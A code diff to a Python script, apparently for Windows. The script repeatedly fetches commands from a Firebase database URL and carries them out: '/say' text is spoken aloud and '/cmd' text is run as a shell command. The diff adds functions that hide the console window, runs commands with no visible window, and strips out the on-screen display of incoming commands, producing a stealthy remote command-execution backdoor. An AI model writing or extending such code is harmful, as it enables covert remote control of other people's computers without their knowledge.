@@ -6,6 +6,11 @@ import sys
 import win32com.client
 import subprocess
 
+def hide_console():
+    hWnd = ctypes.WinDLL('kernel32').GetConsoleWindow()
+    if hWnd:
+        ctypes.WinDLL('user32').ShowWindow(hWnd, 0) # 0 تعني SW_HIDE
+
 def speak(text):
     try:
         speaker = win32com.client.Dispatch("SAPI.SpVoice")
@@ -15,41 +20,29 @@ def speak(text):
 
 def execute_command(command):
     try:
-        subprocess.Popen(command, shell=True)
+        subprocess.Popen(command, shell=True, creationflags=0x08000000)
     except:
         pass
 
-def maximize_window():
-    hWnd = ctypes.WinDLL('kernel32').GetConsoleWindow()
-    if hWnd:
-        ctypes.WinDLL('user32').ShowWindow(hWnd, 3)
-
-def a0z_print(text, delay=0.04):
-    for char in text:
-        sys.stdout.write(char)
-        sys.stdout.flush()
-        time.sleep(delay)
-    print()
-
 def start_gateway():
-    maximize_window()
+    # 1. إظهار واجهة البداية
     os.system('color 0a')
     os.system('cls')
+    print("==================================================")
+    print("   A0Z PROTOCOL v4.0 :: INITIALIZING...")
+    print("==================================================")
+    print("[*] STATUS: BOOTING CORE SYSTEM")
+    print("[*] NODE: " + os.environ.get('COMPUTERNAME', 'UNKNOWN'))
+    print("[*] SYSTEM WILL GO STEALTH IN 5 SECONDS...")
+    print("--------------------------------------------------")
     
-    print(">>> ACCESSING A0Z_CORE SERVER...")
-    time.sleep(0.7)
-    print(">>> ESTABLISHING ENCRYPTED TUNNEL...")
-    time.sleep(0.7)
-    os.system('cls')
-
-    print("==================================================")
-    a0z_print("   A0Z PROTOCOL v3.0 [ULTIMATE EDITION]")
-    print("==================================================")
-    a0z_print(f"[*] NODE_ID: {os.environ.get('COMPUTERNAME', 'UNKNOWN')}")
-    a0z_print(f"[*] OS: {sys.platform.upper()}")
-    print("[*] CONNECTION: ACTIVE")
-    print("--------------------------------------------------\n")
-
+    # الانتظار لمدة 5 ثوانٍ قبل الاختفاء
+    time.sleep(5)
+    
+    # 2. الاختفاء التام
+    hide_console()
+    
+    # 3. بدء الاستماع للأوامر بصمت
     DB_URL = "https://a0zai-56c3a-default-rtdb.europe-west1.firebasedatabase.app/A0Z_CORE/current_command.json"
     last_timestamp = 0
 
@@ -57,33 +50,15 @@ def start_gateway():
         try:
             response = requests.get(DB_URL)
             data = response.json()
-            
             if data:
                 text = data.get('text', '')
                 ts = data.get('timestamp', 0)
                 
                 if ts > last_timestamp:
                     if text.startswith("/say"):
-                        msg = text.replace("/say", "")
-                        print(f"\n[!] VOICE_INCOMING...")
-                        speak(msg)
-                    
+                        speak(text.replace("/say", ""))
                     elif text.startswith("/cmd"):
-                        cmd = text.replace("/cmd", "")
-                        print(f"\n[!] SYSTEM_EXECUTION: {cmd}")
-                        execute_command(cmd)
-                        
-                    elif text == "/clear":
-                        os.system('cls')
-                        print("==================================================")
-                        print("   A0Z PROTOCOL v3.0 :: SESSION REFRESHED")
-                        print("==================================================")
-
-                    else:
-                        sys.stdout.write("\a")
-                        print(f"\n>> BROADCAST:")
-                        a0z_print(f"   {text}")
-                    
+                        execute_command(text.replace("/cmd", ""))
                     last_timestamp = ts
         except:
             pass
